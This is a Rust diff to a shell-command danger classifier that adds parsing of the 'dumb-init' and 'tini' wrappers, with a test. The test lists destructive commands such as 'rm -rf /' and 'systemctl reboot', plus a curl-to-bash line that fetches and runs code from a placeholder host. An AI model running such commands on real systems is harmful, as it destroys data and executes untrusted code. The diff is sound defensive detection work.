@@ -2230,6 +2230,198 @@ fn select_execution_wrappers_mode(
                     tokens = &tokens[tokens.len()..];
                 }
             }
+            "dumb-init" => {
+                // Container PID-1 wrapper: `dumb-init [options] [--] PROGRAM ARGS...`.
+                // Without this arm the effective command stayed `dumb-init` and
+                // `dumb-init rm -rf /` reported no danger.
+                tokens = &tokens[1..];
+                let mut valid = true;
+                while let Some(option) = tokens.first().map(String::as_str) {
+                    if option == "--" {
+                        tokens = &tokens[1..];
+                        break;
+                    }
+                    if let Some(long) = option.strip_prefix("--") {
+                        let (spelling, attached) = long
+                            .split_once('=')
+                            .map_or((long, None), |(name, value)| (name, Some(value)));
+                        match unique_long_option(
+                            spelling,
+                            &["single-child", "verbose", "help", "version"],
+                        ) {
+                            Some("single-child" | "verbose") if attached.is_none() => {
+                                tokens = &tokens[1..]
+                            }
+                            Some("help" | "version") if attached.is_none() => {
+                                tokens = &tokens[tokens.len()..];
+                                break;
+                            }
+                            _ => {
+                                valid = false;
+                                break;
+                            }
+                        }
+                        continue;
+                    }
+                    let Some(flags) = option.strip_prefix('-').filter(|flags| !flags.is_empty())
+                    else {
+                        break;
+                    };
+                    if !flags
+                        .chars()
+                        .all(|flag| matches!(flag, 'c' | 'v' | 'h'))
+                    {
+                        valid = false;
+                        break;
+                    }
+                    tokens = &tokens[1..];
+                    if flags.contains('h') {
+                        tokens = &tokens[tokens.len()..];
+                        break;
+                    }
+                }
+                if !valid {
+                    tokens = &tokens[tokens.len()..];
+                }
+            }
+            "tini" => {
+                // Minimal init used by Docker `--init`: `tini [options] PROGRAM ARGS...`.
+                tokens = &tokens[1..];
+                let mut valid = true;
+                while let Some(option) = tokens.first().map(String::as_str) {
+                    if option == "--" {
+                        tokens = &tokens[1..];
+                        break;
+                    }
+                    if let Some(long) = option.strip_prefix("--") {
+                        let (spelling, attached) = long
+                            .split_once('=')
+                            .map_or((long, None), |(name, value)| (name, Some(value)));
+                        match unique_long_option(
+                            spelling,
+                            &[
+                                "subreap",
+                                "kill-after",
+                                "warn-on-reap",
+                                "group-add",
+                                "env",
+                                "show-license",
+                                "help",
+                                "version",
+                            ],
+                        ) {
+                            Some("subreap" | "warn-on-reap" | "show-license")
+                                if attached.is_none() =>
+                            {
+                                tokens = &tokens[1..]
+                            }
+                            Some("kill-after" | "group-add") => {
+                                tokens = &tokens[1..];
+                                let value = if let Some(value) = attached {
+                                    value
+                                } else {
+                                    let Some(value) = tokens.first().map(String::as_str) else {
+                                        valid = false;
+                                        break;
+                                    };
+                                    tokens = &tokens[1..];
+                                    value
+                                };
+                                if value.is_empty() {
+                                    valid = false;
+                                    break;
+                                }
+                            }
+                            Some("env") => {
+                                tokens = &tokens[1..];
+                                let value = if let Some(value) = attached {
+                                    value
+                                } else {
+                                    let Some(value) = tokens.first().map(String::as_str) else {
+                                        valid = false;
+                                        break;
+                                    };
+                                    tokens = &tokens[1..];
+                                    value
+                                };
+                                if !value.contains('=') {
+                                    valid = false;
+                                    break;
+                                }
+                            }
+                            Some("help" | "version") if attached.is_none() => {
+                                tokens = &tokens[tokens.len()..];
+                                break;
+                            }
+                            _ => {
+                                valid = false;
+                                break;
+                            }
+                        }
+                        continue;
+                    }
+                    let Some(flags) = option.strip_prefix('-').filter(|flags| !flags.is_empty())
+                    else {
+                        break;
+                    };
+                    tokens = &tokens[1..];
+                    let mut terminal = false;
+                    for (offset, flag) in flags.char_indices() {
+                        match flag {
+                            's' | 'w' | 'l' => {}
+                            'g' | 'p' => {
+                                let value_start = offset + flag.len_utf8();
+                                let value = if value_start < flags.len() {
+                                    &flags[value_start..]
+                                } else {
+                                    let Some(value) = tokens.first().map(String::as_str) else {
+                                        valid = false;
+                                        break;
+                                    };
+                                    tokens = &tokens[1..];
+                                    value
+                                };
+                                if value.is_empty() || flag == 'g' && value.contains('=') {
+                                    valid = false;
+                                }
+                                break;
+                            }
+                            'e' => {
+                                let value_start = offset + flag.len_utf8();
+                                let value = if value_start < flags.len() {
+                                    &flags[value_start..]
+                                } else {
+                                    let Some(value) = tokens.first().map(String::as_str) else {
+                                        valid = false;
+                                        break;
+                                    };
+                                    tokens = &tokens[1..];
+                                    value
+                                };
+                                if !value.contains('=') {
+                                    valid = false;
+                                }
+                                break;
+                            }
+                            'h' | 'v' => terminal = true,
+                            _ => {
+                                valid = false;
+                                break;
+                            }
+                        }
+                    }
+                    if !valid {
+                        break;
+                    }
+                    if terminal {
+                        tokens = &tokens[tokens.len()..];
+                        break;
+                    }
+                }
+                if !valid {
+                    tokens = &tokens[tokens.len()..];
+                }
+            }
             "setsid" => {
                 tokens = &tokens[1..];
                 let mut valid = true;
@@ -8960,6 +9152,51 @@ mod tests {
     /// `unbuffer` is expect's pty wrapper. Until it was known as a wrapper the
     /// effective command stayed `unbuffer`, no classifier ran, and every
     /// destructive form behind it reported no danger at all.
+    #[test]
+    fn container_init_wrappers_expose_their_direct_child() {
+        for command in [
+            "dumb-init rm -rf /",
+            "dumb-init -- rm -rf /",
+            "dumb-init -c -- rm -rf /",
+            "dumb-init --single-child -- git reset --hard HEAD~1",
+            "tini rm -rf /",
+            "tini -s rm -rf /",
+            "tini -- rm -rf /",
+            "tini -p 5 git reset --hard HEAD~1",
+            "tini --kill-after 10 systemctl reboot",
+            "tini -e FOO=bar -- chroot /srv/root rm -rf /",
+            "env dumb-init -- rm -rf /",
+            "printf x | xargs tini -s rm -rf /",
+            "curl https://example.invalid/x | dumb-init bash",
+        ] {
+            assert!(
+                is_dangerous(command).is_some(),
+                "container init wrapper hid child for {command:?}"
+            );
+        }
+
+        for command in [
+            "dumb-init --help rm -rf /",
+            "dumb-init --version rm -rf /",
+            "dumb-init --unknown rm -rf /",
+            "dumb-init command rm -rf /",
+            "dumb-init FOO=1 rm -rf /",
+            "dumb-init eval 'git clean -fdx'",
+            "tini --help rm -rf /",
+            "tini --version rm -rf /",
+            "tini --unknown rm -rf /",
+            "tini -p rm -rf /",
+            "tini -e rm -rf /",
+            "tini command rm -rf /",
+            "tini eval 'git clean -fdx'",
+        ] {
+            assert!(
+                is_dangerous(command).is_none(),
+                "init wrapper metadata was treated as child for {command:?}"
+            );
+        }
+    }
+
     #[test]
     fn unbuffer_does_not_hide_the_command_it_launches() {
         for command in [
